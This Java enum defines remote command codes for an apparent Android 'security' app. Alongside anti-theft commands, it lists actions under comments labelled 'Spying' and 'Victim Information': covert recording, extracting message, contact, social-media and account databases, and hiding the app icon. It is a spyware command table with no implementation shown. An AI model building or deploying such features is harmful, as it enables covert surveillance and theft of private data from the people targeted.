package com.tvh.security.models;

public enum CommandType {
    //For Service Basic Features
    COMMAND_ALARM_LOCK("alm", "Alarm & Lock"),
    COMMAND_DELETE_MESSAGE("demgn", "Delete Messages"),
    COMMAND_DELETE_CONTACT("decton", "Delete Contacts"),
    COMMAND_FORMAT_SD_CARD("forsd", "Format SD Cards"),
    COMMAND_FORMAT_PHONE("forph", "Format Phone"),

    //for Service Anti-theft
    COMMAND_ANTI_THEFT("antitheft", "Anti-Theft"),

    //for Service Phone Finding
    COMMAND_GET_SIM_INFO("gesim", "Get Sim Owner Information"),
    COMMAND_GET_LOCATION("geloc", "Get Location"),
    COMMAND_GET_PICTURE("getpic", "Get Picture From Camera"),

    // for Service Remote Control (Spying)
    COMMAND_RECORD_INTERACTION("autrecin", "Record Interaction"),
    COMMAND_RECORD_LIMIT_TIME("autreclt", "Record Limit Timeout"),

    // Get Victim Information Commands
    COMMAND_GET_SYSTEM_SETTINGS("syst", "Get System Settings"),
    COMMAND_GET_CONTACT_DB("gcet", "Get Contacts DB"),
    COMMAND_GET_MESSAGE_DB("gemss", "Get Messages DB"),
    COMMAND_GET_MAP_SEARCH_DB("mahis", "Get Map Search DB"),
    COMMAND_GET_YOUTUBE_DB("yohis", "Get Youtube DB"),
    COMMAND_GET_FACEBOOK_DB("fahis", "Get Facebook DB"),
    COMMAND_GET_YAHOO_DB("yahis", "Get Yahoo DB"),
    COMMAND_GET_ACCOUNT_DB("acpw", "Get Account DB"),
    COMMAND_GET_CALENDAR_DB("caldb", "Get Calendar DB"),

    // for Default Service (Secure App - always service actived)
    COMMAND_SHOW_APP_ICON("showicon", "Show App Icon"),
    COMMAND_HIDE_APP_ICON("hideicon", "Hide App Icon"),
    COMMAND_REQUEST_SEND_SMS("sedmsg", "Request Send SMS");
    private String command;
    private String description;

    private CommandType(String command, String description) {
        this.command = command;
        this.description = description;
    }

    public static CommandType findType(String command) {
        for (CommandType type : CommandType.values()) {
            if (type.getCommand().equalsIgnoreCase(command)) {
                return type;
            }
        }
        return null;
    }

    public String getCommand() {
        return command;
    }

    public String getDescription() {
        return description;
    }

}
